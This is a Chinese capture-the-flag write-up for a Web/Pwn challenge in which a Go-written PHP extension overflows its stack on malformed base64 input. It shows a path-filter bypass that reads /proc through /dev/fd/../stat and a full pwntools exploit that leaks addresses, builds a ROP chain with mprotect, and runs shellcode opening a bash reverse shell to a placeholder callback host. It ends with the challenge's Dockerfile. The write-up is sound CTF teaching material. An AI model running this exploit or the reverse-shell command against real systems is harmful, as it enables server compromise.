# base64

## 题目简述

这是 cfgo 系列的 Web/Pwn 混合题。Web 侧能读文件并调用一个由 Go 编写的 PHP 扩展 `cfgoPHPExt_new.so`；扩展正常 base64 解码时没有问题，但解码异常时会在返回缓冲区前拼接一段 ASCII art，再把异常前已解码内容 `memcpy` 到后面，导致 Go/PHP 扩展栈溢出。利用目标是先拿到 `.so` 和 libc/栈/PIE 地址，再通过覆盖 Go slice 结构实现任意读和 ROP。

## 解题过程

这是cfgo-xx系列的第三题，推荐先看完pwn下面两题再来看这题。

这题的两解都不算预期，因为之前的webpwn都具有文件读然后通过/proc/self/maps就能拿到libc、扩展so的基地址，这样很不好，所以让web关卡的出题队友设置了禁止/proc下的读取，但是没想到DefenitelyZer0通过软连接 `..//..//../..//dev/fd/../stat` 拿到了/proc的内容，2333333.

```bash
ls /dev/fd
# /dev/fd -> /proc/self/fd
```

因此路径中绕到 `/dev/fd/../stat` 时，实际等价于读取 `/proc/self/stat`，可以绕过对 `proc/self/maps` 这类关键字的过滤。

外部 WP 的关键补充是：该题虽然归类为 Web，但核心漏洞在 Go 写的 PHP 扩展；`cfgoPHPExt_new.so` 是 DSO，开启 PIE/NX/Canary；可通过 `..//..//../..//dev/fd/../stat` 读取 `/proc/self/stat` 泄漏进程基址，再结合固定/爆破 Go runtime stack 地址进行 stack pivot。原文链接可作为调试细节参考： [ptr-yudai 的 base64 题解](https://ptr-yudai.hatenablog.com/entry/2020/08/03/120153#Web-952pts-base64-2-solves)

其次在找地址的过程中，由于apache的进程都是fork出来的，pie地址在重启apache服务前不会改变，所以两队都采用的brute-forcing的方法找到了栈上局部变量的位置（null连so的基地址也是爆破的）。。。。。。下次一定要写个cron定期service apache2 restart一下。

>下面是wp

首先为了搞懂漏洞点我们需要拿到so文件，这里有两种路线：


1. 通过web关卡，读文件拿到，路径就是ubuntu 19.04中apt install php-dev后的默认路径/usr/lib/php/20170718/ 。web关卡也很简单，限制了50长度，对目录层数进行了检测，源码如下。
```plain
    function dir_count($filename){
$depath = 0;
foreach (explode('/', $filename) as $part) {
if ($part == '..') {
$depath--;
} elseif ($part != '.') {
$depath++;
}
}
return $depath;
}

if ($_GET['filename']!=NULL) {
$filename=$_GET['filename'];
if(strlen($filename)>50){
die("You're over the limit");
}
$filename=preg_replace("/(flag)|(proc)|(self)|(maps)/i","w&m",$filename);
if(dir_count($filename)>0){
echo file_get_contents('./hint/'.$filename);
}
else {
echo "You're over the limit";
}
}
```
2. 不断利用栈溢出，找到slice结构体的位置，覆盖array、len、cap达到任意读的目的，然后不停leak直到把so dump出来，这样其实就可以无视web关卡变成纯pwn游戏了 （理论可行）

通过分析so可以看到base64解码正常时是没有任何漏洞的，而且还限制了输入长度。当base64解码过程发生异常的时候，会在返回结果前面塞一坨ascii字符画大概100多bytes，然后再把异常前解码出来的内容memcpy到其后面，这里会造成一个栈溢出。触发异常的话只要在正常base64后面加一个简简单单的字符就行，比如base64.b64encode(data)+'a'。由于最后我们溢出的局部变量buf是作为返回值返回到网页的，所以只要通过gdb调试找到 局部变量buf在栈上的偏移，改掉array、len、cap就能实现任意读了，我们可以：


1. 通过 0xc000000030找到扩展so的基地址
2. 通过扩展so的got表找到libc的基地址
3. 通过部分写array指针的低地址为\x40找到stack地址（这道题不需要爆破的哦，通过调试是比较容易发现的）
4. 然后rop调用mprotect给栈地址洗剪吹(rwx)一下，执行我们的shellcode，最后反弹shell到公网ip就行了
```python
#-*- coding: utf-8 -*-
from pwn import *
import requests
import urllib

if len(sys.argv) > 1:
    s = requests.session()
else:
    os._exit(1)
__author__ = '3summer'
binary_file = "./cfgoPHPExt_new.so"
context.binary = binary_file
context.terminal = ['tmux', 'sp', '-h']
# context.log_level = 'debug'
elf = ELF("./cfgoPHPExt_new.so")
libc = ELF('./libc-2.29.so')
def send(data):
    print hexdump(data)
    # print repr(data)
    # r = s.get('http://%s/test.php?enc=%s' % (sys.argv[1], urllib.urlencode({'a':base64.b64encode(data)})[2:]+'a') )
    r = s.post('%s' % sys.argv[1], data = {'text': base64.b64encode(data)+'a' } )
    print hexdump(r.content)
    return r.content

uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
tmp = send( flat('A'*0x6c,
            0xc000000030,8,8,
            0xc000000030,8,8,
        )
    )
# tmp = tmp.split(') "')[1]
elf.address = uu64(tmp[:6]) - 0x2a47c0
success('elf base:0x%x' % elf.address)
tmp = send( flat('a'*0x6c,
            elf.got.free,8,8,
            elf.got.free,8,8,
        )
    )
# tmp = tmp.split(') "')[1]
libc.address = uu64(tmp[:6]) - libc.sym.free
success('libc base:0x%x' % libc.address)
tmp = send( flat('a'*0x6c,
            'b'*0x18,
            p8(0x40)
        )
    )
tmp = tmp.split('b'*0x18)[1]
stack = uu64(tmp[:3]) + 0xc000000000
success('stack base:0x%x' % stack)
print hex(0x1701F1+elf.address)

# libc
pop_rdi = libc.address + 0x0000000000026542#: pop rdi; ret;
pop_rsi = libc.address + 0x0000000000026f9e#: pop rsi; ret;
pop_rdx = libc.address + 0x000000000012bda6#: pop rdx; ret;
# 0x000000000012bdc9: pop rdx; pop rsi; ret;
pop_rax = libc.address + 0x0000000000047cf8#: pop rax; ret;
pop_rcx = libc.address + 0x000000000010b31e#: pop rcx; ret;
pop_rbx_r12 = libc.address + 0x0000000000030e4c#: pop rbx; pop r12; ret;
mov_rsi_rax = libc.address + 0x000000000008c77a#: mov qword ptr [rsi], rax; xor eax, eax; ret;
mov_rdi_rcx = libc.address + 0x00000000000b54b6#: mov qword ptr [rdi], rcx; ret;
# cfgo
0x00000000000f9ba4#: mov rbp, rsp; and rsp, 0xfffffffffffffff0; call rax;
0x00000000000f9b74#: mov rbx, rsp; and rsp, 0xfffffffffffffff0; call rax;
cmd = '/bin/bash -c "bash -i >& /dev/tcp/<callback-host>/<callback-port> 0>&1"\x00'
sc = \
'''mov rdi, 0x%x\nmov rax, 0x%x\nmov rsp, 0xc000006000\npush rax\npush rax\nret''' % (stack+0x6c, libc.sym.system)
print disasm(asm(sc))
shellcode = cmd + asm(sc)
# send( flat(cmd.ljust(0x6c,'\x00'),
send( flat(shellcode.ljust(0x84,'\x90'),
            0xc000000000,8,8,
            0xc000000000,
            pop_rdi, 0xc000000000,
            pop_rbx_r12, 0x123, 0x123,
            pop_rdx, 7,
            pop_rsi,  4000000 ,
            libc.sym.mprotect, stack+0x6c+len(cmd),
        )
    )
```
最后说几句：

1. 扩展使用 [php-go](https://github.com/kitech/php-go) 开发。该项目用于用 Go 编写 PHP 扩展，支持函数、结构/类、常量和基本/复杂参数类型，环境要求 PHP 5.5+/7.x、Go 1.4+ 及 php-dev；这解释了为什么题目里会出现 Go runtime 栈、Go slice 结构和 PHP 扩展同时存在的情况。
2. 本地调试可以这样去做（或者要用pwntools的process）php -d extension=./cfgoPHPExt.so -a
3. 部署到apache后，ps -ef可以看到大概5、6个apache进程，我们不能确定下次访问是哪个进程处理我们的请求，如果需要调试可以这样做：先随便 gdb attach一个，设置好断点，然后c跑起来。另外一边不断用脚本去发送请求，大概10次左右gdb就能断下来了
4. 最后附上docker文件
```python
FROM ubuntu:19.04
ENV DEBIAN_FRONTEND=noninteractive
RUN echo "deb http://old-releases.ubuntu.com/ubuntu disco main restricted" > /etc/apt/sources.list
RUN echo "deb http://old-releases.ubuntu.com/ubuntu disco-updates main restricted" >> /etc/apt/sources.list
RUN echo "deb http://old-releases.ubuntu.com/ubuntu disco-security main restricted" >> /etc/apt/sources.list
RUN apt update && apt install -y apache2 php-dev libapache2-mod-php
ADD --chown=root:root cfgoPHPExt_new.so /usr/lib/php/20170718/
ADD --chown=root:root html /var/www/html
RUN echo "extension=cfgoPHPExt_new.so" >> /etc/php/7.2/apache2/php.ini

ADD --chown=root:www-data readflag /readflag
ADD --chown=root:root flag /flag
RUN chmod 750 /readflag && chmod u+s /readflag && chmod 400 /flag
EXPOSE 80
CMD exec /bin/bash -c "service apache2 restart; trap : TERM INT; sleep infinity & wait"
```

## 方法总结

- 核心技巧：Web 任意读拿扩展文件，Go PHP 扩展异常路径触发栈溢出，覆盖 slice 的 `array/len/cap` 实现任意读，泄漏 `.so`/libc/栈后 ROP 或 stack pivot。
- 识别信号：PHP 扩展由 Go 编写、题目提示“需要 pwner”、异常输入才触发崩溃、返回值会带出溢出后缓冲区时，应按 Go runtime 栈布局和 slice 结构分析。
- 复用要点：外部 WP 的关键信息是 `/proc/self/stat` 可泄漏基址、Apache fork 进程 PIE 在重启前稳定、Go runtime stack 可固定/爆破；长期 WP 中保留这些条件即可，不必依赖外链。
